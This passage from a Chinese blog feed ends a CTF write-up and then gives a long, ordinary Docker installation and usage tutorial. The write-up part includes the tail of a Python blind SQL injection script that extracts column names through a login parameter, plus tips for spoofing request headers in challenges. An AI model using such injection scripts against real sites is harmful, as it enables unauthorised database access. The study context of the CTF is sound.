admin),&#123;&#125;,1)='&#123;&#125;'%23&amp;pass=12456&amp;action=login"</span></span><br><span class="line"><span class="keyword">while</span>(<span class="keyword">True</span>):</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">		res = requests.get(url + payload.format(str(length),i)).text.encode(<span class="string">'latin-1'</span>).decode(<span class="string">'gb2312'</span>)</span><br><span class="line">		<span class="keyword">if</span> yes <span class="keyword">in</span> res:</span><br><span class="line">			<span class="comment"># table_name += i</span></span><br><span class="line">			column_name += i</span><br><span class="line">			length += <span class="number">1</span></span><br><span class="line">			print(column_name)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		<span class="keyword">if</span> i == <span class="string">'@'</span>:</span><br><span class="line">			print(<span class="string">'aaaaaaaaaaaaaaaaaaaaaa'</span>)</span><br><span class="line"><span class="comment"># admin,idnuenna</span></span><br></pre></td></tr></table></figure>
<h1 id="猫抓老鼠"><a href="#猫抓老鼠" class="headerlink" title="猫抓老鼠"></a>猫抓老鼠</h1><p>脑洞题，注意题目响应头 <code>Content-Row: MTUyODYyMjkxMQ==</code> 直接把这个内容提交验证即可。。</p>
<h1 id="头有点大"><a href="#头有点大" class="headerlink" title="头有点大"></a>头有点大</h1><p>打开后看到有如下要求</p>
<blockquote>
<p>You don’t have permission to access / on this server.<br>Please make sure you have installed .net framework 9.9!<br>Make sure you are in the region of England and browsing this site with Internet Explorer</p>
</blockquote>
<p>第一个本题好像实际上并没有限制，第二个可以通过修改user-agent字段，修改为</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 9.9; .NET CLR 3.5.30729; rv:11.0)</span> like Geckog</span><br></pre></td></tr></table></figure>
<p>第三个要求来自英国，可以通过修改accept-language字段的值</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">en-gb;<span class="attribute">q</span>=0.8</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> writeup </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Docker简介与简单页面搭建]]></title>
      <url>/2018/04/20/docker1/</url>
      <content type="html"><![CDATA[<h1 id="Docker简介"><a href="#Docker简介" class="headerlink" title="Docker简介"></a>Docker简介</h1><p>最近要和同学做一个PHP项目需要用到docker，正好也对这个东东挺好奇的，顺便来学习一波，何为docker呢？docker的本质其实就是容器，类似于虚拟机，但是又比虚拟机更加小巧，容器技术是基于linux的内核特性(Namespace和Cgroups)的一项技术，所以在其上只能运行类linux系统而不能运行Windows系统，使用虚拟机部署文件时既需要应用和应用依赖的库，还需要完整的操作系统，但是容器的话则只需要应用和应用依赖的库即可，但是在docker之前容器的应用并不广泛，原因在于容器的自动化程度不高，部署复杂，而docker的出现则弥补了这些缺点，所以能够得到业界广泛的使用。</p>
<a id="more"></a>
<p><img src="docker1/1.jpg" alt=""></p>
<h1 id="Docker安装"><a href="#Docker安装" class="headerlink" title="Docker安装"></a>Docker安装</h1><h2 id="安装前检查"><a href="#安装前检查" class="headerlink" title="安装前检查"></a>安装前检查</h2><ol>
<li>内核版本(具体支持哪些版本可以在官网查看)</li>
</ol>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">uname -a</span></span><br></pre></td></tr></table></figure>
<p>如果内核不支持可以升级内核</p>
<ol>
<li>检查Device Mapper(存储驱动)</li>
</ol>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls  -l <span class="regexp">/sys/</span><span class="keyword">class</span><span class="regexp">/misc/</span>device-mapper</span><br></pre></td></tr></table></figure>
<p>查看文件是否存在</p>
<h2 id="安装Docker"><a href="#安装Docker" class="headerlink" title="安装Docker"></a>安装Docker</h2><p>安装Docker有两种可用的版本，一种是Ubuntu维护的版本，一种是Docker维护的版本，推荐安装Docker维护的版本，因为它的版本较新，安装步骤官方已经编写成一个脚本，可以非常简单的安装，我们只需要下载这个脚本并运行即可，</p>
<h3 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h3><p>试了好多种方法才安装好，最后还是用了官方推荐的方法，我的版本号如下</p>
<blockquote>
<p>Linux ubuntu 4.10.0-37-generic #41-Ubuntu SMP Fri Oct 6 20:20:37 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</p>
</blockquote>
<p>由于在公共镜像仓库拉取镜像需要https协议，需要对于组件的安装。</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-<span class="builtin-name">get</span> install curl</span><br><span class="line">apt-<span class="builtin-name">get</span> install ca-certificates</span><br><span class="line">apt-<span class="builtin-name">get</span> install software-properties-common</span><br></pre></td></tr></table></figure>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-<span class="built_in">get</span> install  apt-transprt-<span class="keyword">https</span></span><br></pre></td></tr></table></figure>
<p>安装不顺利，报错：Unable to locate package apt-transprt-https，需要单独下载安装包及依赖包</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget http:<span class="comment">//ftp.nl.debian.org/debian/pool/main/a/apt/apt-transport-https_1.4.8_amd64.deb</span></span><br><span class="line">dpkg -<span class="selector-tag">i</span> apt-transport-https_1.<span class="number">4.8</span>_amd64.deb</span><br><span class="line">wget http:<span class="comment">//ftp.nl.debian.org/debian/pool/main/a/apt/libapt-pkg5.0_1.4.8_amd64.deb</span></span><br><span class="line">dpkg -<span class="selector-tag">i</span> libapt-pkg5.<span class="number">0</span>_1.<span class="number">4.8</span>_amd64.deb</span><br></pre></td></tr></table></figure>
<p>添加 Docker 官方的 GPG key</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -fssl http<span class="variable">s:</span>//download.docker.<span class="keyword">com</span>/linux/ubuntu/gpg | sudo apt-key <span class="built_in">add</span> -</span><br></pre></td></tr></table></figure>
<p>将 Docker 的源添加到 /etc/apt/sources.list</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">add</span><span class="bash">-apt-repository <span class="string">"deb [arch=amd64] https://download.docker.com/linux/ubuntu <span class="variable">$(lsb_release -cs)</span> stable"</span></span></span><br></pre></td></tr></table></figure>
<p>更新一下镜像</p>
<figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-<span class="built_in">get</span> <span class="keyword">update</span></span><br></pre></td></tr></table></figure>
<p>安装docker</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-<span class="builtin-name">get</span> install docker-ce</span><br></pre></td></tr></table></figure>
<p>开启docker守护进程</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo<span class="built_in"> service </span>docker start</span><br></pre></td></tr></table></figure>
<p>运行第一个容器，输出‘hello world’</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker <span class="keyword">run</span><span class="bash"> centos <span class="built_in">echo</span> <span class="string">'hello world'</span></span></span><br></pre></td></tr></table></figure>
<h3 id="CentOS"><a href="#CentOS" class="headerlink" title="CentOS"></a>CentOS</h3><p>执行安装脚本</p>
<figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="built_in">get</span> <span class="keyword">update</span></span><br></pre></td></tr></table></figure>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL http<span class="variable">s:</span>//<span class="built_in">get</span>.docker.<span class="keyword">com</span>/ | <span class="keyword">sh</span></span><br></pre></td></tr></table></figure>
<p>安装完成后查看版本信息</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker <span class="built_in">version</span></span><br></pre></td></tr></table></figure>
<p>开启docker守护进程</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo<span class="built_in"> service </span>docker start</span><br></pre></td></tr></table></figure>
<p>运行第一个容器，输出‘hello world’</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker <span class="keyword">run</span><span class="bash"> centos <span class="built_in">echo</span> <span class="string">'hello world'</span></span></span><br></pre></td></tr></table></figure>
<p>以上命令都只是在root权限下运行，如果要在非root权限下运行，则需要将当前用户添加进去docker用户组中</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sudo groupadd docker</span></span><br></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gpasswd -<span class="selector-tag">a</span> charles docker</span><br></pre></td></tr></table></figure>
<p>之后重启docker服务</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo<span class="built_in"> service </span>docker restart</span><br></pre></td></tr></table></figure>
<p>注销当前账户再重新登录即可运行docker命令啦！</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">version</span></span><br></pre></td></tr></table></figure>
<h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p>Windows安装比较简单，到网址下载之后按照要求安装即可</p>
<p><img src="docker1/2.jpg" alt=""></p>
<h1 id="Docker的基本操作"><a href="#Docker的基本操作" class="headerlink" title="Docker的基本操作"></a>Docker的基本操作</h1><h2 id="启动容器"><a href="#启动容器" class="headerlink" title="启动容器"></a>启动容器</h2><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="bash"> centos <span class="built_in">echo</span> <span class="string">'hello world'</span></span></span><br></pre></td></tr></table></figure>
<p>在输出hello world之后镜像也就关闭了，无法交互</p>
<h2 id="启动交互式容器"><a href="#启动交互式容器" class="headerlink" title="启动交互式容器"></a>启动交互式容器</h2><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="bash"> -i -t IMAGE /bin/bash</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>-i: —interactive=true|默认是false，为容器始终打开标准输入<br>-t: —tty,为容器分配一个伪tty终端</p>
</blockquote>
<p>退出交互shell使用 <code>exit</code> 命令</p>
<h2 id="查看容器"><a href="#查看容器" class="headerlink" title="查看容器"></a>查看容器</h2><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps <span class="string">[-a]</span> <span class="string">[-l]</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>-a: all<br>-l: latest</p>
</blockquote>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">inspect</span> 容器唯一ID或名字</span><br></pre></td></tr></table></figure>
<p>该命令可以查看容器的详细信息</p>
<p><strong>定义容器名字</strong></p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="builtin-name">run</span> <span class="attribute">--name</span>=container01 -i -t ubuntu /bin/bash</span><br></pre></td></tr></table></figure>
<h2 id="重新启动停止的容器"><a href="#重新启动停止的容器" class="headerlink" title="重新启动停止的容器"></a>重新启动停止的容器</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">start</span> -i 容器名或<span class="keyword">ID</span></span><br></pre></td></tr></table></figure>
<h2 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h2><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">docker</span></span> rm ..</span><br></pre></td></tr></table></figure>
<p>注意： 只能删除已经停止的容器</p>
<h1 id="守护式容器"><a href="#守护式容器" class="headerlink" title="守护式容器"></a>守护式容器</h1><blockquote>
<p>能够长期运行<br>没有交互式会话<br>适合运行应用程序和服务</p>
</blockquote>
<p>以守护形式运行容器</p>
<p>以下列命令打开一个容器</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dcoker <span class="keyword">run</span><span class="bash"> -i -t ubuntu /bin/bash</span></span><br></pre></td></tr></table></figure>
<p>但是并不以exit命令退出而是以 <code>ctrl P+Q</code>退出，这样容器就会在后台运行</p>
<p>可以使用 <code>docker ps -a</code> 来查看容器状态可以发下容器确实在后台运行</p>
<p>使用attach命令再次进入容器</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">attach</span> 容器ID</span><br></pre></td></tr></table></figure>
<p>使用 <code>exit</code> 命令即可退出容器</p>
<p>启动守护式容器最重要的方式</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="bash"> -d 镜像名 [<span class="built_in">command</span>]</span></span><br></pre></td></tr></table></figure>
<hr>
<p>我们来启动一个守护式容器</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="bash"> --name dc1 -d ubuntu /bin/sh -c <span class="string">"while true;do echo 'hello world'; sleep 1; done"</span></span></span><br></pre></td></tr></table></figure>
<p>容器在后台运行，可以使用日志来查看执行情况</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker logs -tf <span class="comment">--tail 0 dc1</span></span><br></pre></td></tr></table></figure>
<p>参数的具体含义可在帮助文档中查看</p>
<p>除了使用logs之外，还可使用进程命令</p>
<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">top</span> dc1</span><br></pre></td></tr></table></figure>
<p>在已经运行的容器中启动新的进程</p>
<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec <span class="string">[-d]</span> <span class="string">[-i]</span> <span class="string">[-t]</span> 容器名 <span class="string">[command]</span></span><br></pre></td></tr></table></figure>
<p>关闭守护式容器有两种方法</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">stop</span> dcname</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">kill</span> dcname</span><br></pre></td></tr></table></figure>
<p>stop命令会等待容器执行完毕后关闭容器，而kill则会直接关闭容器。</p>
<hr>
<p>具体想要查看更多命令的相关情况可以使用man命令</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">man docker-<span class="keyword">run</span><span class="bash"></span></span><br><span class="line"><span class="bash">man docker-top</span></span><br><span class="line"><span class="bash">...</span></span><br></pre></td></tr></table></figure>
<h1 id="在docker容器中部署静态网站"><a href="#在docker容器中部署静态网站" class="headerlink" title="在docker容器中部署静态网站"></a>在docker容器中部署静态网站</h1><ol>
<li>设置容器的端口映射</li>
</ol>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">run</span><span class="bash"> -p|-P</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>-P: 对容器所有的端口进行映射<br>-p: 指定映射哪些容器的端口</p>
</blockquote>
<p><img src="docker1/3.jpg" alt=""></p>
<ol>
<li>开始部署</li>
</ol>
<p>先运行一个带端口映射的容器</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -<span class="selector-tag">i</span> -t --name web -<span class="selector-tag">p</span> <span class="number">80</span> ubuntu /bin/bash</span><br></pre></td></tr></table></figure>
<p>进入容器之后安装Nginx</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-<span class="builtin-name">get</span> update</span><br><span class="line">apt-<span class="builtin-name">get</span> install -y nginx</span><br></pre></td></tr></table></figure>
<p>接下来安装vim，用来编辑网页文件和配置文件</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-<span class="builtin-name">get</span> install -y vim</span><br></pre></td></tr></table></figure>
<p>新建一个工作目录</p>
<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p /<span class="built_in">var</span>/www/html</span><br></pre></td></tr></table></figure>
<p>切换到工作目录下,编辑一个静态页面</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> /var/www/html</span><br><span class="line"><span class="keyword">vim</span> <span class="built_in">index</span>.html</span><br></pre></td></tr></table></figure>
<p>具体编辑过程省略，接下来编辑Nginx配置文件</p>
<p>查找一下Nginx文件的位置</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">whereis nginx</span></span><br></pre></td></tr></table></figure>
<p>查看文件目录</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ls</span> <span class="string">/etc/nginx</span></span><br></pre></td></tr></table></figure>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ls</span> <span class="string">/etc/nginx/sites-enabled</span></span><br></pre></td></tr></table></figure>
<p>可以看到有个default文件，修改该文件</p>
<p>将root的值改为刚才创建的文件目录</p>
<blockquote>
<p>root: /var/www/html</p>
</blockquote>
<p>这样，配置就完成了，切换回根目录,运行Nginx</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /</span><br><span class="line">nginx</span><br></pre></td></tr></table></figure>
<p>可以使用ps命令查看nginx是否已经运行</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ps -ef</span></span><br></pre></td></tr></table></figure>
<p>可以看到命令已经运行了,还可以查看到端口号，然后用Ctrl+P+Q退出</p>
<p>然后访问静态页面</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">http:</span><span class="comment">//127.0.0.1:port</span></span><br></pre></td></tr></table></figure>
<p>我们也可以用容器的IP地址来访问</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker inspect web</span></span><br></pre></td></tr></table></figure>
<p>可以看到容器ip地址和映射端口</p>
<blockquote>
<p>“IPAddress”: “172.17.0.2”<br>“HostPort”: “32768”</p>
</blockquote>
<p>访问</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">http:</span><span class="comment">//172.17.0.2</span></span><br></pre></td></tr></table></figure>
<p>这就不需要指定端口号了，用默认的80端口即可</p>
<p>我们停止该容器</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">stop</span> web</span><br></pre></td></tr></table></figure>
<p>然后在打开该服务</p>
<p>运行 <code>ps -ef</code> 可以看到并没有开启Nginx服务</p>
<p>这是退出容器</p>
<p>然后用exec命令开启Nginx服务</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> web nginx</span><br></pre></td></tr></table></figure>
<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">top</span> web</span><br></pre></td></tr></table></figure>
<p>可以看到Nginx服务已经开启，但是这是不能用前面的ip地址访问，因为容器映射的地址已经改变，需要重新查看地址映射才能访问</p>
<p>至此，简单搭建静态页面完成。</p>
<h1 id="Docker镜像操作"><a href="#Docker镜像操作" class="headerlink" title="Docker镜像操作"></a>Docker镜像操作</h1><p>镜像是容器构架的基石，接下里介绍一下如何查看和删除镜像</p>
<figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker images [OPTIONS] [REPOSITORY]</span><br><span class="line">	-<span class="ruby">a,--all=<span class="literal">false</span></span></span><br><span class="line"><span class="ruby">	-f,--filter /<span class="regexp">/过滤条件</span></span></span><br><span class="line"><span class="ruby">	--no-trunc=<span class="literal">false</span> /<span class="regexp">/以非截断方式显示镜像信息，默认关闭</span></span></span><br><span class="line"><span class="ruby">	-q,--quiet=<span class="literal">false</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker images centos</span></span><br></pre></td></tr></table></figure>
<p>返回docker中对应的centos镜像</p>
<hr>
<p>查看镜像</p>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker inspect [OPTIONS] CONTAINER|<span class="built_in">IMAGE</span> [CONTAINER|<span class="built_in">IMAGE</span>...]</span><br><span class="line">	-f,--<span class="built_in">format</span>=<span class="string">""</span></span><br></pre></td></tr></table></figure>
<p>删除镜像</p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker rmi [<span class="keyword">OPTIONS</span>] IMAGE</span><br><span class="line">	-f,--force=<span class="keyword">false</span> <span class="comment">//强制删除</span></span><br><span class="line">	--no-prune=<span class="keyword">false</span> <span class="comment">//保留镜像中未打标签的父镜像</span></span><br></pre></td></tr></table></figure>
<h1 id="获取和查找镜像"><a href="#获取和查找镜像" class="headerlink" title="获取和查找镜像"></a>获取和查找镜像</h1><h2 id="查找镜像"><a href="#查找镜像" class="headerlink" title="查找镜像"></a>查找镜像</h2><ul>
<li>Docker Hub</li>
</ul>
<blockquote>
<p>在官方网站上进行搜索</p>
</blockquote>
<ul>
<li>docker search [OPTIOINS] TREM<br>  —automated=false Only show automated builds<br>  —no-trunc=false Don’t truncate output<br>  -s,—stars=0 Only displays with at least stars</li>
</ul>
<p><strong>EXAMPLE:</strong> </p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker search ubuntu</span></span><br></pre></td></tr></table></figure>
<h2 id="获取和推送镜像"><a href="#获取和推送镜像" class="headerlink" title="获取和推送镜像"></a>获取和推送镜像</h2><p><strong><em>拉取镜像</em></strong></p>
<figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker pull [OPTIONS] <span class="keyword">NAME</span> [:TAG]</span><br><span class="line">	-a,--<span class="built_in">all</span>-tags=false Download <span class="built_in">all</span> tagged images <span class="keyword">in</span> the respository</span><br></pre></td></tr></table></figure>
<p>EXP:</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">docker</span> <span class="selector-tag">pull</span> <span class="selector-tag">ubuntu</span><span class="selector-pseudo">:14.04</span></span><br></pre></td></tr></table></figure>
<p>这个命令拉取镜像的速度不是非常可观，这是因为站点在国外的原因，可以通过设置国内镜像源来提高下载速度</p>
<p>在 <code>daocloud</code> 上注册账户，点击加速器，复制命令在自己的主机上执行即可发现再拉取镜像是速度明显提高</p>
<p><strong><em>推送镜像</em></strong></p>
<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker push NAME<span class="string">[:TAG]</span></span><br></pre></td></tr></table></figure>
<h1 id="构建镜像"><a href="#构建镜像" class="headerlink" title="构建镜像"></a>构建镜像</h1><p>构建镜像可以帮我们保存对容器的修改，方便再次使用；同时也可以自定义镜像，还可以以软件的形式打包并分发服务及运行环境</p>
<h2 id="使用commit来构建镜像"><a href="#使用commit来构建镜像" class="headerlink" title="使用commit来构建镜像"></a>使用commit来构建镜像</h2><p>创建一个镜像</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">run</span> -<span class="keyword">it</span> -p <span class="number">80</span> <span class="comment">--name commit_test ubuntu /bin/bash</span></span><br></pre></td></tr></table></figure>
<p>提交镜像</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker commit -<span class="selector-tag">a</span> <span class="string">'charles'</span> -m <span class="string">'nginx'</span> 仓库名</span><br></pre></td></tr></table></figure>
<h2 id="使用dockerfile创建镜像"><a href="#使用dockerfile创建镜像" class="headerlink" title="使用dockerfile创建镜像"></a>使用dockerfile创建镜像</h2><p>自行百度，略</p>
<h1 id="Docker守护进程的配置与操作"><a href="#Docker守护进程的配置与操作" class="headerlink" title="Docker守护进程的配置与操作"></a>Docker守护进程的配置与操作</h1><h2 id="查看守护进程"><a href="#查看守护进程" class="headerlink" title="查看守护进程"></a>查看守护进程</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ps</span> -ef|<span class="keyword">grep</span> docker</span><br><span class="line">sudo status docker</span><br></pre></td></tr></table></figure>
<h2 id="Docker守护进程的停止开始"><a href="#Docker守护进程的停止开始" class="headerlink" title="Docker守护进程的停止开始"></a>Docker守护进程的停止开始</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo<span class="built_in"> service </span>docker stop|start|restart</span><br></pre></td></tr></table></figure>
<p>Docker配置被修改后需要重启才能够生效</p>
<h2 id="Docker的启动配置文件-配置docker的启动信息"><a href="#Docker的启动配置文件-配置docker的启动信息" class="headerlink" title="Docker的启动配置文件(配置docker的启动信息)"></a>Docker的启动配置文件(配置docker的启动信息)</h2><p>文件位置</p>
<blockquote>
<p>/etc/default/docker</p>
</blockquote>
<p>利用该文件可以修改docker的各种启动配置信息</p>
<h1 id="Docker的远程访问"><a href="#Docker的远程访问" class="headerlink" title="Docker的远程访问"></a>Docker的远程访问</h1><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><blockquote>
<p>第二台安装docker的服务器<br>修改docker守护进程的启动选项以区别服务器<br>保证client API与server API版本一致</p>
</blockquote>
<h1 id="Dcoker的容器卷管理"><a href="#Dcoker的容器卷管理" class="headerlink" title="Dcoker的容器卷管理"></a>Dcoker的容器卷管理</h1><ol>
<li>直接指定文件</li>
</ol>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -v ~<span class="string">/datavolume</span>:[ro]<span class="string">/data</span>[<span class="function">:ro</span>] ubuntu <span class="string">/bin/bash</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>/datavolumn指定源文件位置如果文件不存在则会自动创建，/data指定docker文件中的文件位置，[ro]指定文件访问权限</p>
</blockquote>
<ol>
<li>创建dockerfile</li>
</ol>
<h1 id="Docker容器互联"><a href="#Docker容器互联" class="headerlink" title="Docker容器互联"></a>Docker容器互联</h1><p>分别演示三部分</p>
<blockquote>
<p>允许所有容器互联(默认)；拒绝容器间互联；允许特定容器间的连接</p>
</blockquote>
